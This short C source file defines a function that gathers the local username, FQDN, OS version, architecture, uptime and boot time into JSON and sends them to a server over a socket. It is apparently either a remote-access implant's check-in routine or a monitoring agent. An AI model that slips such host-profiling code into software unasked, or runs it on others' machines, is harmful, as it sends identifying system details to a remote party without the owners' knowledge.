#include "info-sender.h"

int send_system_info(SOCKET target_sock) {
    cJSON *sys_info_json = cJSON_CreateObject();

    append_username_to_json(sys_info_json);
    append_fqdn_to_json(sys_info_json);
    append_os_version_to_json(sys_info_json);
    append_os_architecture_to_json(sys_info_json);
    append_uptime_to_json(sys_info_json);
    append_boot_time_to_json(sys_info_json);

    return send_json_object_to_server(target_sock, sys_info_json);
}